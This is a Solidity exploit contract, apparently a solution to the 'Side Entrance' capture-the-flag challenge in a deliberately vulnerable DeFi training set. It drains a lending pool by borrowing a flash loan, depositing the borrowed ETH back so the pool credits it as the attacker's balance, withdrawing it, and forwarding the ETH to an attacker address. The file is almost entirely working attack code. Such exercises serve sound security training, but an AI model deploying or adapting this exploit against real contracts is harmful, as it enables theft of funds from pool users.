// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract SideEntranceReceiver {
    SideEntranceLenderPool private immutable pool;
    address payable attacker;

    constructor(address _poolAdr, address _attackerAdr) {
        pool = SideEntranceLenderPool(_poolAdr);
        attacker = payable(_attackerAdr);
    }

    /**
     * Call attack to initiate flashLoan... the pool will
     * call execute then withdraw the deposited amount since our
     * address is already registered in balance
     */
    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
    }

    /**
     * This function will be called by pool's flashLoan()
     */
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    /**
     * Will receive ETH after withdraw() is called
     */
    receive() external payable {
        attacker.transfer(msg.value);
    }
}
